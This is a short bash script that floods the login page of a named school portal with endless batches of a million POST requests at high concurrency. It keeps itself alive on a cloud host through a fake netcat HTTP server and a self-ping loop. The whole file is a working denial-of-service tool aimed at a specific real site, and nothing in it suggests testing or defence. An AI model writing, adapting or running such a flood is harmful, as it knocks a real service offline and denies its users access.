#!/bin/bash
TARGET="https://eportal.mabest-academy.com/login.php"
BODY="/app/login.txt"
C="${CONCURRENCY:-300}"
PORT="${PORT:-10000}"

# Simple HTTP server that responds with "OK" to keep service alive
( while true; do
    echo -e "HTTP/1.1 200 OK\nContent-Length: 2\n\nOK" | nc -l -p $PORT;
done ) &

# Wait a moment for the server to start
sleep 1

# Update SELF_URL to use the port
SELF_URL="http://localhost:$PORT"
echo "[$(date)] Flood starting. C=$C Self=$SELF_URL"

# Keep-alive: ping our own public URL every 5 min so Render doesn't sleep us
( while true; do
    sleep 300
    curl -s -o /dev/null "$SELF_URL" && echo "[$(date)] keepalive ok"
  done ) &

# Main flood loop
while true; do
  hey -n 1000000 -c $C -m POST -T "application/x-www-form-urlencoded" -D "$BODY" "$TARGET"
  echo "[$(date)] batch done, restarting"
  sleep 1
done